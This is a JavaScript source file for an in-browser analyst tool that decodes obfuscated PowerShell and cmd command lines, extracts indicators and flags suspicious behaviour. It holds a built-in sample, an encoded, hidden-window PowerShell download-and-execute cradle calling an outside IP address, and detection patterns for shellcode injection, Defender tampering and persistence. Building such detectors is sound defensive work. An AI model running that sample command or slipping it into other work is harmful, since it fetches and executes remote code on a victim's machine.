/* DecodeSphere - SOC Toolkit
 * Peels obfuscation off PowerShell and Windows command lines, entirely in the browser.
 * No network, no storage: every transform below is local computation on the pasted text.
 * Public engine (also used by the test harness): window.CMDDEC
 */
(function () {
  "use strict";

  /* ---------- byte / text helpers ---------- */

  function stripWs(s) { return s.replace(/[\s\r\n]+/g, ""); }

  function isPrintable(str) {
    if (!str.length) return 0;
    var ok = 0;
    for (var i = 0; i < str.length; i++) {
      var c = str.charCodeAt(i);
      if (c === 9 || c === 10 || c === 13 || (c >= 32 && c <= 126) || c >= 160) ok++;
    }
    return ok / str.length;
  }

  function b64ToBytes(str) {
    var s = stripWs(str).replace(/-/g, "+").replace(/_/g, "/");
    var pad = s.length % 4;
    if (pad === 2) s += "==";
    else if (pad === 3) s += "=";
    else if (pad === 1) return null;
    var bin;
    try { bin = atob(s); } catch (e) { return null; }
    var out = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  }

  // Decode bytes to text, auto-detecting UTF-16LE (how PowerShell -EncodedCommand is stored).
  function bytesToText(bytes) {
    var total = 0, zerosOdd = 0;
    for (var i = 1; i < bytes.length; i += 2) { total++; if (bytes[i] === 0) zerosOdd++; }
    var looksUtf16 = total > 0 && (zerosOdd / total) > 0.6;
    try {
      if (looksUtf16) return { text: new TextDecoder("utf-16le").decode(bytes), enc: "UTF-16LE" };
    } catch (e) { /* fall through */ }
    try {
      return { text: new TextDecoder("utf-8", { fatal: false }).decode(bytes), enc: "UTF-8" };
    } catch (e2) {
      var r = "";
      for (var j = 0; j < bytes.length; j++) r += String.fromCharCode(bytes[j]);
      return { text: r, enc: "bytes" };
    }
  }

  function hasMagic(b, m) {
    if (!b || b.length < m.length) return false;
    for (var i = 0; i < m.length; i++) if (b[i] !== m[i]) return false;
    return true;
  }

  // Local gzip/deflate using the browser's built-in DecompressionStream (no library, no network).
  function inflate(bytes, format) {
    if (typeof DecompressionStream === "undefined") return Promise.resolve(null);
    try {
      var ds = new DecompressionStream(format);
      var w = ds.writable.getWriter();
      w.write(bytes); w.close();
      return new Response(ds.readable).arrayBuffer()
        .then(function (buf) { return new Uint8Array(buf); })
        .catch(function () { return null; });
    } catch (e) { return Promise.resolve(null); }
  }

  // Longest base64-looking run in a string (ignores obvious non-payload words).
  function longestB64(s) {
    var re = /[A-Za-z0-9+/_-]{16,}={0,2}/g, m, best = "";
    while ((m = re.exec(s))) { if (m[0].length > best.length) best = m[0]; }
    return best;
  }

  /* ---------- individual decode layers ----------
   * Each returns {name, detail, output} when it meaningfully changed the input, else null.
   * Async layers return a Promise of the same.
   */

  // cmd.exe caret escaping: p^o^w^e^r^s^h^e^l^l  ->  powershell
  function tryCaret(s) {
    if (s.indexOf("^") === -1) return null;
    var obf = (s.match(/[A-Za-z0-9]\^[A-Za-z0-9"']/g) || []).length;
    if (obf < 2) return null;
    var out = s.replace(/\^\^/g, "\u0001").replace(/\^/g, "").replace(/\u0001/g, "^");
    if (out === s) return null;
    return { name: "cmd caret escaping", detail: "Removed ^ escape characters used to break up keywords.", output: out };
  }

  // cmd set-variable obfuscation: set a=powershell  &  %a% ...   (incl. %v:~s,l% and %v:x=y%)
  function tryCmdVars(s) {
    if (!/\bset\b/i.test(s) || s.indexOf("%") === -1) return null;
    var vars = {}, re = /set\s+(?:\/a\s+)?"?([A-Za-z_][\w]*)=([^"\r\n&|]*)"?/gi, m, found = 0;
    while ((m = re.exec(s))) { vars[m[1].toLowerCase()] = m[2]; found++; }
    if (!found) return null;
    function expand(str) {
      var prev = null, pass = 0;
      while (str !== prev && pass < 12) {
        prev = str; pass++;
        str = str.replace(/[%!]([A-Za-z_][\w]*)(?::([^%!]*))?[%!]/g, function (full, name, op) {
          var v = vars[name.toLowerCase()];
          if (v === undefined) return full;
          if (op === undefined) return v;
          var mm;
          if ((mm = op.match(/^~(-?\d+)(?:,(-?\d+))?$/))) {
            var start = parseInt(mm[1], 10), len = mm[2] !== undefined ? parseInt(mm[2], 10) : undefined;
            if (start < 0) start = Math.max(0, v.length + start);
            var end;
            if (len === undefined) end = v.length;
            else if (len < 0) end = v.length + len;
            else end = start + len;
            return v.slice(start, end);
          }
          if ((mm = op.match(/^([^=]*)=(.*)$/))) {
            if (mm[1] === "") return v;
            return v.split(mm[1]).join(mm[2]);
          }
          return v;
        });
      }
      return str;
    }
    var out = expand(s);
    if (out === s) return null;
    return { name: "cmd set-variable obfuscation", detail: "Resolved %VAR% / !VAR! references, including substring and replace forms.", output: out };
  }

  // powershell -EncodedCommand / -enc / -ec <base64>  (base64 is usually UTF-16LE)
  function tryEncodedCommand(s) {
    var m = s.match(/-e[a-z]*\s+(['"]?)([A-Za-z0-9+/=_-]{16,})\1/i) ||
            s.match(/-e[a-z]*\s+([A-Za-z0-9+/=_-]{20,})/i);
    if (!m) return null;
    var b64 = m[2] || m[1];
    var bytes = b64ToBytes(b64);
    if (!bytes || bytes.length < 4) return null;
    var r = bytesToText(bytes);
    if (isPrintable(r.text) < 0.8) return null;
    return { name: "PowerShell -EncodedCommand", detail: "Base64 → " + r.enc + " text.", output: r.text };
  }

  // gzip/deflate payload carried as base64 (FromBase64String + GzipStream/DeflateStream).
  function tryGzipB64(s) {
    var tok = longestB64(s);
    if (tok.length < 24) return null;
    var bytes = b64ToBytes(tok);
    if (!bytes) return null;
    var fmt = null;
    if (hasMagic(bytes, [0x1f, 0x8b])) fmt = "gzip";
    else if (hasMagic(bytes, [0x78, 0x01]) || hasMagic(bytes, [0x78, 0x9c]) || hasMagic(bytes, [0x78, 0xda])) fmt = "deflate";
    else if (/deflatestream/i.test(s)) fmt = "deflate-raw";
    else return null;
    return inflate(bytes, fmt).then(function (out) {
      if (!out) return null;
      var r = bytesToText(out);
      if (isPrintable(r.text) < 0.7) return null;
      return { name: (fmt === "gzip" ? "Gzip" : "Deflate") + " + Base64", detail: "Base64 → decompress → " + r.enc + " text.", output: r.text };
    });
  }

  // plain base64 blob (no flag) - the token must dominate and decode to clean text
  function tryBase64(s) {
    var tok = longestB64(s);
    if (tok.length < 20) return null;
    if (/^[0-9a-fA-F]+$/.test(tok) && tok.length % 2 === 0) return null; // let hex layer handle it
    var bytes = b64ToBytes(tok);
    if (!bytes || bytes.length < 4) return null;
    if (hasMagic(bytes, [0x1f, 0x8b]) || hasMagic(bytes, [0x78, 0x9c])) return null; // gzip layer handles it
    var r = bytesToText(bytes);
    if (isPrintable(r.text) < 0.9) return null;
    if (r.text.replace(/\s/g, "") === s.replace(/\s/g, "")) return null;
    var out = s.length - tok.length > 2 ? s.replace(tok, r.text) : r.text;
    return { name: "Base64", detail: tok.length === stripWs(s).length ? ("Decoded as " + r.enc + ".") : "Decoded the embedded Base64 blob.", output: out };
  }

  // char-code arrays: [char]72, @(72,101,108,...), 0x48,0x65,...  then -join ''
  function tryCharCodes(s) {
    var nums = s.match(/0x[0-9a-fA-F]{1,6}|\b\d{1,7}\b/g);
    if (!nums || nums.length < 4) return null;
    // only treat as char codes when the string is dominated by the numeric list
    var joined = nums.join(",");
    if (joined.replace(/,/g, "").length < s.replace(/[^0-9a-fA-Fx]/g, "").length * 0.6) return null;
    var txt = "", good = 0;
    for (var i = 0; i < nums.length; i++) {
      var n = nums[i].slice(0, 2) === "0x" ? parseInt(nums[i], 16) : parseInt(nums[i], 10);
      if (n >= 1 && n <= 0x10ffff) { txt += String.fromCodePoint(n); if (n === 9 || n === 10 || n === 13 || (n >= 32 && n <= 126) || n >= 160) good++; }
    }
    if (!txt || good / nums.length < 0.85) return null;
    return { name: "Character codes", detail: nums.length + " code points → text.", output: txt };
  }

  // hex: \x41\x42, 41 42 43, 41,42  (even number of nibbles)
  function tryHex(s) {
    var seq = s.match(/(?:\\x[0-9a-fA-F]{2})+/g);
    var src, kind;
    if (seq) { src = seq.join("").replace(/\\x/g, ""); kind = "\\xNN escapes"; }
    else {
      var pairs = s.match(/\b(?:[0-9a-fA-F]{2}[\s,]+){3,}[0-9a-fA-F]{2}\b/);
      if (!pairs) return null;
      src = pairs[0].replace(/[\s,]+/g, ""); kind = "hex pairs";
    }
    if (src.length < 8 || src.length % 2) return null;
    var txt = "", good = 0, total = src.length / 2;
    for (var i = 0; i < src.length; i += 2) {
      var n = parseInt(src.substr(i, 2), 16);
      txt += String.fromCharCode(n);
      if (n === 9 || n === 10 || n === 13 || (n >= 32 && n <= 126)) good++;
    }
    if (good / total < 0.85) return null;
    var out = seq ? txt : s.replace(/\b(?:[0-9a-fA-F]{2}[\s,]+){3,}[0-9a-fA-F]{2}\b/, txt);
    return { name: "Hex", detail: total + " bytes from " + kind + ".", output: out };
  }

  // percent / URL encoding: %41%42 or %u0041
  function tryPercent(s) {
    if ((s.match(/%[0-9a-fA-F]{2}/g) || []).length < 3) return null;
    var out = s.replace(/%u([0-9a-fA-F]{4})/gi, function (_, h) { return String.fromCharCode(parseInt(h, 16)); })
               .replace(/%([0-9a-fA-F]{2})/g, function (_, h) { return String.fromCharCode(parseInt(h, 16)); });
    if (out === s) return null;
    return { name: "URL / percent encoding", detail: "Decoded %NN sequences.", output: out };
  }

  // A and \u{41} escapes
  function tryUnicodeEsc(s) {
    if ((s.match(/\\u\{?[0-9a-fA-F]{2,6}\}?/g) || []).length < 3) return null;
    var out = s.replace(/\\u\{([0-9a-fA-F]{1,6})\}/g, function (_, h) { return String.fromCodePoint(parseInt(h, 16)); })
               .replace(/\\u([0-9a-fA-F]{4})/g, function (_, h) { return String.fromCharCode(parseInt(h, 16)); });
    if (out === s) return null;
    return { name: "Unicode escapes", detail: "Decoded \\uXXXX sequences.", output: out };
  }

  // textual PowerShell deobfuscation: backticks, string concat, simple -f format
  function tryDeobfPs(s) {
    var out = s;
    // backtick escape between word chars: Inv`oke-Ex`pression -> Invoke-Expression
    out = out.replace(/`(?=[A-Za-z0-9_])/g, "");
    // collapse 'a'+'b' and "a"+"b" concatenations, repeatedly
    var prev = null, pass = 0;
    while (out !== prev && pass < 20) {
      prev = out; pass++;
      out = out.replace(/(['"])((?:(?!\1).)*)\1\s*\+\s*(['"])((?:(?!\3).)*)\3/g, function (_, q1, a, q2, b) { return q1 + a + b + q1; });
    }
    // simple format operator: ('{0}{1}' -f 'a','b')
    out = out.replace(/(['"])((?:(?!\1).)*)\1\s*-f\s*((?:\s*(['"])(?:(?!\4).)*\4\s*,?)+)/gi, function (full, q, fmt, argsRaw) {
      var args = [], ar = /(['"])((?:(?!\1).)*)\1/g, mm;
      while ((mm = ar.exec(argsRaw))) args.push(mm[2]);
      if (!args.length) return full;
      return q + fmt.replace(/\{(\d+)\}/g, function (_, i) { return args[+i] !== undefined ? args[+i] : "{" + i + "}"; }) + q;
    });
    if (out === s) return null;
    return { name: "PowerShell string tricks", detail: "Removed backtick escapes and joined split strings.", output: out };
  }

  var LAYERS = [tryCaret, tryCmdVars, tryEncodedCommand, tryGzipB64, tryBase64, tryCharCodes, tryHex, tryPercent, tryUnicodeEsc, tryDeobfPs];

  // Run one layer (sync or async) and normalise to a Promise.
  function runLayer(fn, s) {
    var r;
    try { r = fn(s); } catch (e) { return Promise.resolve(null); }
    return (r && typeof r.then === "function") ? r : Promise.resolve(r);
  }

  // Peel layers until nothing changes (or we loop / hit the cap).
  function decode(input, opts) {
    opts = opts || {};
    var max = opts.maxLayers || 16;
    var steps = [], seen = {}, current = input;
    seen[current] = 1;
    function nextLayer(i) {
      if (i >= LAYERS.length) return Promise.resolve(null);
      return runLayer(LAYERS[i], current).then(function (res) {
        if (res && res.output && res.output !== current) return res;
        return nextLayer(i + 1);
      });
    }
    function loop() {
      if (steps.length >= max) return Promise.resolve();
      return nextLayer(0).then(function (res) {
        if (!res) return Promise.resolve();
        if (seen[res.output]) return Promise.resolve(); // cycle guard
        steps.push(res); current = res.output; seen[res.output] = 1;
        return loop();
      });
    }
    return loop().then(function () {
      return { steps: steps, output: current, input: input };
    });
  }

  // Single forced transform (manual mode).
  function transform(input, mode, key) {
    var fns = {
      "base64": tryBase64, "encodedcommand": tryEncodedCommand, "gzip": tryGzipB64,
      "charcodes": tryCharCodes, "hex": tryHex, "url": tryPercent, "unicode": tryUnicodeEsc,
      "caret": tryCaret, "cmdvars": tryCmdVars, "ps": tryDeobfPs
    };
    if (mode === "reverse") return Promise.resolve({ steps: [{ name: "Reverse", detail: "Reversed the string.", output: input.split("").reverse().join("") }], output: input.split("").reverse().join(""), input: input });
    if (mode === "rot13") { var r = rot13(input); return Promise.resolve({ steps: [{ name: "ROT13", detail: "Rotated letters by 13.", output: r }], output: r, input: input }); }
    if (mode === "xor") return Promise.resolve(xorTransform(input, key));
    var fn = fns[mode];
    if (!fn) return decode(input);
    return runLayer(fn, input).then(function (res) {
      if (!res) return { steps: [], output: input, input: input, note: "That transform did not apply to this input." };
      return { steps: [res], output: res.output, input: input };
    });
  }

  function rot13(s) {
    return s.replace(/[a-zA-Z]/g, function (c) {
      var b = c <= "Z" ? 65 : 97;
      return String.fromCharCode((c.charCodeAt(0) - b + 13) % 26 + b);
    });
  }

  function parseKey(key) {
    if (!key) return null;
    var k = key.trim();
    var hex = k.replace(/0x/gi, "").replace(/[\s,]+/g, "");
    if (/^[0-9a-fA-F]+$/.test(hex) && hex.length % 2 === 0 && (/0x/i.test(key) || /[\s,]/.test(key) || hex.length > k.length - 2)) {
      var a = [];
      for (var i = 0; i < hex.length; i += 2) a.push(parseInt(hex.substr(i, 2), 16));
      return a;
    }
    var out = [];
    for (var j = 0; j < k.length; j++) out.push(k.charCodeAt(j) & 0xff);
    return out;
  }

  // XOR: if a key is given, apply it; otherwise brute-force every single byte and pick the most text-like.
  function xorTransform(input, key) {
    var src = [];
    for (var i = 0; i < input.length; i++) src.push(input.charCodeAt(i) & 0xff);
    var kb = parseKey(key);
    if (kb && kb.length) {
      var o = "";
      for (var j = 0; j < src.length; j++) o += String.fromCharCode(src[j] ^ kb[j % kb.length]);
      return { steps: [{ name: "XOR", detail: "Key: " + key, output: o }], output: o, input: input };
    }
    var bestK = 0, bestScore = -1, bestOut = "";
    for (var k = 1; k < 256; k++) {
      var t = "", score = 0;
      for (var m = 0; m < src.length; m++) { var c = src[m] ^ k; t += String.fromCharCode(c); if ((c >= 32 && c <= 126) || c === 9 || c === 10 || c === 13) score++; }
      if (score > bestScore) { bestScore = score; bestK = k; bestOut = t; }
    }
    return { steps: [{ name: "XOR (brute-forced)", detail: "Best single-byte key: 0x" + bestK.toString(16).padStart(2, "0"), output: bestOut }], output: bestOut, input: input };
  }

  /* ---------- analysis of the decoded result ---------- */

  function refang(s) { return s.replace(/\[\.\]|\(\.\)|\{\.\}/g, ".").replace(/h(?:xx|XX)p(s?):\/\//gi, "http$1://").replace(/\[:\]/g, ":"); }

  function uniq(arr) { var seen = {}, out = []; for (var i = 0; i < arr.length; i++) { var k = arr[i].toLowerCase(); if (!seen[k]) { seen[k] = 1; out.push(arr[i]); } } return out; }

  // Valid TLDs, from the toolkit's bundled IANA list (data/tlds.js -> SOC_TLDS); small fallback if absent.
  var TLD = null;
  function tldSet() {
    if (TLD) return TLD;
    TLD = {};
    var src = (typeof window !== "undefined" && window.SOC_TLDS) || (typeof SOC_TLDS !== "undefined" ? SOC_TLDS : "");
    if (src) src.split(" ").forEach(function (t) { if (t) TLD[t] = 1; });
    else "com net org io co uk ru cn de jp fr info biz xyz top online site gov edu mil in us ca au nl eu ch it es se no fi pl br me cc tv ws pw club live icu site".split(" ").forEach(function (t) { TLD[t] = 1; });
    return TLD;
  }

  function extractIOCs(text) {
    var t = refang(text);
    var urls = uniq((t.match(/\b(?:https?|ftp):\/\/[^\s"'`<>)\]}]+/gi) || []).map(function (u) { return u.replace(/[.,;)]+$/, ""); }));
    var ips = uniq((t.match(/\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g) || []));
    var unc = uniq((t.match(/\\\\[A-Za-z0-9._$-]+\\[^\s"'`<>|]+/g) || []));
    var winpaths = uniq((t.match(/\b[A-Za-z]:\\[^\s"'`<>|*?]+/g) || []).concat(t.match(/%[A-Za-z]+%\\[^\s"'`<>|]+/g) || []).concat(t.match(/\$env:[A-Za-z]+\\[^\s"'`<>|]+/gi) || []));
    var reg = uniq((t.match(/\bHK(?:LM|CU|CR|U|CC)\\[^\s"'`<>|]+/gi) || []).concat(t.match(/\bHKEY_[A-Z_]+\\[^\s"'`<>|]+/g) || []));
    var hosts = [];
    urls.forEach(function (u) { var h = u.match(/:\/\/([^\/:\s]+)/); if (h) hosts.push(h[1]); });
    var tlds = tldSet();
    var domains = uniq((t.match(/\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z][a-z0-9-]{1,23}\b/gi) || [])
      .filter(function (d) {
        if (/^\d+\.\d+$/.test(d) || ips.indexOf(d) !== -1) return false;
        var last = d.split(".").pop().toLowerCase();
        return tlds[last] === 1 || /^xn--/.test(last);
      }));
    return { urls: urls, ips: ips, hosts: uniq(hosts), domains: domains, unc: unc, paths: winpaths, registry: reg };
  }

  var SIGNS = [
    [/\bIEX\b|Invoke-Expression/i, "bad", "Executes a string as code (IEX / Invoke-Expression)"],
    [/DownloadString|DownloadFile|DownloadData|Net\.WebClient|Invoke-WebRequest|\bIWR\b|Invoke-RestMethod|Start-BitsTransfer/i, "bad", "Downloads remote content"],
    [/FromBase64String|Convert\]::FromBase64/i, "bad", "Decodes an embedded Base64 payload"],
    [/Reflection\.Assembly|\[Reflection|Load\(\[|GetMethod\(|Marshal::/i, "bad", "Loads code via .NET reflection"],
    [/VirtualAlloc|WriteProcessMemory|CreateThread|CreateRemoteThread|memcpy|shellcode|RtlMoveMemory/i, "bad", "Allocates/executes memory - shellcode injection pattern"],
    [/certutil\b[^\n]*(?:-decode|-urlcache|-f\b|-split)/i, "bad", "certutil used to decode or fetch a file"],
    [/\bmshta\b|\brundll32\b[^\n]*javascript:|regsvr32[^\n]*\/i:|\bbitsadmin\b/i, "bad", "Living-off-the-land binary used to run remote code"],
    [/-enc(?:odedcommand)?\b|-e\s+[A-Za-z0-9+/=]{20,}/i, "warn", "Carries a Base64-encoded command"],
    [/-w(?:indowstyle)?\s+hidden|-w\s+h\b/i, "warn", "Runs with a hidden window"],
    [/-nop\b|-noprofile/i, "warn", "Skips the PowerShell profile"],
    [/-ep\s+bypass|-exec\w*\s+bypass|ExecutionPolicy\s+bypass/i, "warn", "Bypasses the execution policy"],
    [/-noni|-noninteractive/i, "info", "Runs non-interactively"],
    [/New-Object\b/i, "warn", "Instantiates a .NET object"],
    [/schtasks\b[^\n]*\/create|Register-ScheduledTask/i, "warn", "Creates a scheduled task (persistence)"],
    [/reg(?:\.exe)?\s+add[^\n]*\\Run|CurrentVersion\\Run/i, "warn", "Writes a Run key (persistence)"],
    [/Set-MpPreference|Add-MpPreference|DisableRealtimeMonitoring|-ExclusionPath/i, "bad", "Tampers with Microsoft Defender"],
    [/Start-Process\b|Invoke-Item/i, "info", "Launches another process"],
    [/\bhidden\b/i, "info", "References a hidden window or item"]
  ];

  function flagBehaviors(text) {
    var out = [];
    for (var i = 0; i < SIGNS.length; i++) if (SIGNS[i][0].test(text)) out.push({ sev: SIGNS[i][1], why: SIGNS[i][2] });
    var order = { bad: 0, warn: 1, info: 2 };
    out.sort(function (a, b) { return order[a.sev] - order[b.sev]; });
    return out;
  }

  // Fixed shorthands PowerShell treats specially (prefix would otherwise be ambiguous).
  var FLAG_ABBR = {
    "nop": "NoProfile", "noni": "NonInteractive", "w": "WindowStyle", "win": "WindowStyle",
    "ep": "ExecutionPolicy", "exec": "ExecutionPolicy", "enc": "EncodedCommand", "ec": "EncodedCommand",
    "e": "EncodedCommand", "c": "Command", "f": "File", "sta": "Sta", "mta": "Mta"
  };
  var FLAG_CANON = ["NoProfile", "NonInteractive", "NoLogo", "NoExit", "WindowStyle", "ExecutionPolicy",
    "EncodedCommand", "Command", "File", "Version", "InputFormat", "OutputFormat", "Sta", "Mta"];

  function normFlag(tok) {
    var raw = tok.replace(/^[-\/]+/, "").toLowerCase();
    if (!raw) return null;
    if (FLAG_ABBR[raw]) return "-" + FLAG_ABBR[raw];
    var hits = FLAG_CANON.filter(function (c) { return c.toLowerCase().indexOf(raw) === 0; });
    if (hits.length === 1) return "-" + hits[0];
    for (var i = 0; i < FLAG_CANON.length; i++) if (FLAG_CANON[i].toLowerCase() === raw) return "-" + FLAG_CANON[i];
    return null;
  }
  var EXES = /\b(powershell(?:\.exe)?|pwsh(?:\.exe)?|cmd(?:\.exe)?|wscript(?:\.exe)?|cscript(?:\.exe)?|mshta(?:\.exe)?|rundll32(?:\.exe)?|regsvr32(?:\.exe)?|certutil(?:\.exe)?|bitsadmin(?:\.exe)?|wmic(?:\.exe)?|msbuild(?:\.exe)?|installutil(?:\.exe)?)\b/i;

  function tokenize(s) {
    var out = [], cur = "", q = null;
    for (var i = 0; i < s.length; i++) {
      var c = s[i];
      if (q) { if (c === q) q = null; else cur += c; }
      else if (c === '"' || c === "'") q = c;
      else if (/\s/.test(c)) { if (cur) { out.push(cur); cur = ""; } }
      else cur += c;
    }
    if (cur) out.push(cur);
    return out;
  }

  function parseCommandLine(input) {
    var line = input.split(/\r?\n/)[0];
    if (!EXES.test(line)) return null;
    var toks = tokenize(line);
    if (!toks.length) return null;
    var exeIdx = -1;
    for (var i = 0; i < toks.length; i++) if (EXES.test(toks[i])) { exeIdx = i; break; }
    if (exeIdx === -1) return null;
    var exe = toks[exeIdx];
    var flags = [], j = exeIdx + 1;
    while (j < toks.length) {
      var tk = toks[j];
      if (tk[0] === "-" || tk[0] === "/") {
        var norm = normFlag(tk);
        var val = "";
        if (j + 1 < toks.length && toks[j + 1][0] !== "-" && toks[j + 1][0] !== "/") { val = toks[j + 1]; j++; }
        flags.push({ flag: tk, value: val, meaning: norm });
      }
      j++;
    }
    return { exe: exe, flags: flags };
  }

  window.CMDDEC = {
    decode: decode, transform: transform, extractIOCs: extractIOCs,
    flagBehaviors: flagBehaviors, parseCommandLine: parseCommandLine,
    iocToItems: iocToItems, // defined below; function declarations hoist within this scope
    _layers: LAYERS, refang: refang
  };

  /* ---------- sample (built locally so it is always valid) ---------- */
  // cmd caret-escaped powershell with a UTF-16LE -enc payload that downloads & runs a script.
  function buildSample() {
    var script = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/a.ps1')";
    if (typeof btoa === "undefined" || typeof TextEncoder === "undefined") return script;
    // UTF-16LE bytes -> base64 (how PowerShell -EncodedCommand is produced)
    var bytes = [];
    for (var i = 0; i < script.length; i++) { var c = script.charCodeAt(i); bytes.push(c & 0xff, (c >> 8) & 0xff); }
    var bin = "";
    for (var k = 0; k < bytes.length; k++) bin += String.fromCharCode(bytes[k]);
    var b64 = btoa(bin);
    return "cmd.exe /c p^o^w^e^r^s^h^e^l^l -nop -w hidden -ec " + b64;
  }

  /* ---------- UI wiring (browser only) ---------- */

  function h(tag, attrs, kids) {
    var el = document.createElement(tag);
    if (attrs) for (var k in attrs) {
      if (k === "class") el.className = attrs[k];
      else if (k === "text") el.textContent = attrs[k];
      else if (k === "html") el.innerHTML = attrs[k];
      else if (k === "color") el.style.setProperty("--c", attrs[k]); // CSSOM: allowed under style-src 'self'
      else if (k === "on") for (var ev in attrs[k]) el.addEventListener(ev, attrs[k][ev]);
      else if (attrs[k] != null) el.setAttribute(k, attrs[k]);
    }
    if (kids) (Array.isArray(kids) ? kids : [kids]).forEach(function (c) { if (c != null) el.appendChild(typeof c === "string" ? document.createTextNode(c) : c); });
    return el;
  }

  function copyText(text, btn) {
    var done = function (ok) { var o = btn.textContent; btn.textContent = ok ? "Copied" : "Copy failed"; setTimeout(function () { btn.textContent = o; }, 1400); };
    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(function () { done(true); }, function () { done(fallbackCopy(text)); });
    else done(fallbackCopy(text));
  }
  function fallbackCopy(text) {
    var ta = document.createElement("textarea");
    ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
    document.body.appendChild(ta); ta.select();
    var ok = false; try { ok = document.execCommand("copy"); } catch (e) { ok = false; }
    document.body.removeChild(ta); return ok;
  }
  function download(name, text) {
    var blob = new Blob([text], { type: "text/plain" });
    var url = URL.createObjectURL(blob);
    var a = document.createElement("a");
    a.href = url; a.download = name; document.body.appendChild(a); a.click();
    document.body.removeChild(a); setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
  }

  function sevPill(sev) { return { bad: "p-threat", warn: "p-warn", info: "p-geo" }[sev] || "p-geo"; }
  function sevWord(sev) { return { bad: "High", warn: "Suspicious", info: "Note" }[sev] || "Note"; }

  function clip(s, n) { return s.length > n ? s.slice(0, n) + "…" : s; }

  function render(res, raw) {
    var view = document.getElementById("view-res");
    view.innerHTML = "";

    var iocs = extractIOCs(res.output + "\n" + raw);
    var iocCount = iocs.urls.length + iocs.ips.length + iocs.domains.length + iocs.unc.length + iocs.paths.length + iocs.registry.length;
    var flags = flagBehaviors(res.output + "\n" + raw);
    var topSev = flags.length ? flags[0].sev : null;
    var cmd = parseCommandLine(raw);

    // top bar
    view.appendChild(h("div", { class: "res-bar" }, [
      h("div", {}, [
        h("h2", { class: "res-title", text: res.steps.length ? "Decoded output" : "No obfuscation found" }),
        h("p", { class: "status" + (topSev === "bad" ? " err" : topSev === "warn" ? " warn" : ""), text:
          res.steps.length + " layer" + (res.steps.length === 1 ? "" : "s") + " peeled · " + flags.length + " behaviour flag" + (flags.length === 1 ? "" : "s") + " · " + iocCount + " IOC" + (iocCount === 1 ? "" : "s") })
      ]),
      h("div", { class: "tools" }, [
        h("button", { class: "btn btn-ghost", type: "button", text: "Copy output", on: { click: function (e) { copyText(res.output, e.currentTarget); } } }),
        h("button", { class: "btn btn-ghost", type: "button", text: "Download report", on: { click: function () { download("decode-" + new Date().toISOString().slice(0, 10) + ".txt", report(res, raw, iocs, flags, cmd)); } } }),
        h("button", { class: "btn btn-primary", type: "button", text: "New input", on: { click: showInput } })
      ])
    ]));

    // tiles
    var tiles = h("div", { class: "tiles" }, [
      tile(res.steps.length, "Layers", "var(--violet)"),
      tile(flags.length, "Flags", topSev === "bad" ? "var(--bad)" : topSev === "warn" ? "var(--warn)" : "var(--neutral)"),
      tile(iocCount, "IOCs", "var(--magenta)"),
      tile(res.output.length, "Chars out", "var(--amber)")
    ]);
    view.appendChild(tiles);

    var grid = h("div", { class: "res-grid" });

    // ---- left column ----
    var left = h("div", { class: "col" });

    if (res.steps.length) {
      var chain = h("ol", { class: "chain" });
      res.steps.forEach(function (st, i) {
        chain.appendChild(h("li", { class: "chain-step" }, [
          h("div", { class: "chain-head" }, [
            h("span", { class: "step-n", text: String(i + 1) }),
            h("div", {}, [h("strong", { text: st.name }), h("span", { class: "chain-detail", text: st.detail || "" })]),
            h("button", { class: "btn btn-ghost btn-sm", type: "button", text: "Copy", on: { click: function (e) { copyText(st.output, e.currentTarget); } } })
          ]),
          h("pre", { class: "code", text: clip(st.output, 4000) })
        ]));
      });
      left.appendChild(card("Decode chain", chain));
    }

    var outWrap = h("div", {}, [
      h("pre", { class: "code code-final", text: res.output || "(empty)" }),
      h("div", { class: "card-foot" }, [
        h("p", { class: "note", text: res.note || "Final output after all layers were peeled." }),
        h("button", { class: "btn btn-ghost btn-sm", type: "button", text: "Copy", on: { click: function (e) { copyText(res.output, e.currentTarget); } } })
      ])
    ]);
    left.appendChild(card("Final command", outWrap));

    // IOCs
    var iocCard = h("div", {});
    var iocGroups = [
      ["URL", iocs.urls, "var(--t-url)"], ["IP", iocs.ips, "var(--t-ip)"], ["Domain", iocs.domains, "var(--t-domain)"],
      ["Host", iocs.hosts.filter(function (hn) { return iocs.ips.indexOf(hn) === -1; }), "var(--t-domain)"],
      ["UNC", iocs.unc, "var(--t-path)"], ["Path", iocs.paths, "var(--t-file)"], ["Registry", iocs.registry, "var(--t-path)"]
    ].filter(function (g) { return g[1].length; });
    if (iocGroups.length) {
      var allIocs = [];
      iocGroups.forEach(function (g) {
        g[1].forEach(function (v) {
          allIocs.push(v);
          iocCard.appendChild(h("div", { class: "row iocrow" }, [
            h("span", { class: "tbadge", color: g[2], text: g[0] }),
            h("span", { class: "rval", text: v }),
            h("button", { class: "btn btn-ghost btn-sm", type: "button", text: "Copy", on: { click: function (e) { copyText(v, e.currentTarget); } } })
          ]));
        });
      });
      var iocHead = h("div", { class: "card-head" }, [
        h("h2", { text: "Indicators (" + iocCount + ")" }),
        h("button", { class: "btn btn-ghost btn-sm", type: "button", text: "Copy all", on: { click: function (e) { copyText(allIocs.join("\n"), e.currentTarget); } } })
      ]);
      var iocSection = h("section", { class: "card" }, [iocHead, iocCard]);
      left.appendChild(iocSection);
    } else {
      left.appendChild(card("Indicators", h("p", { class: "empty", text: "No URLs, IPs, domains or paths found in the decoded text." })));
    }

    // Behaviour (left column, after Indicators)
    var flagInner = h("div", {});
    if (flags.length) {
      flags.forEach(function (f) {
        flagInner.appendChild(h("div", { class: "flagline" }, [
          h("span", { class: "pill " + sevPill(f.sev), text: sevWord(f.sev) }),
          h("span", { class: "flagwhy", text: f.why })
        ]));
      });
    } else {
      flagInner.appendChild(h("p", { class: "empty", text: "No known suspicious tokens in the decoded text." }));
    }
    left.appendChild(card("Behaviour", flagInner));

    // Parsed command line (left column, after Behaviour)
    if (cmd) {
      var clInner = h("div", {});
      clInner.appendChild(h("div", { class: "clrow clexe" }, [h("span", { class: "tbadge", color: "var(--magenta)", text: "EXE" }), h("span", { class: "rval", text: cmd.exe })]));
      if (cmd.flags.length) {
        cmd.flags.forEach(function (fl) {
          clInner.appendChild(h("div", { class: "clrow" }, [
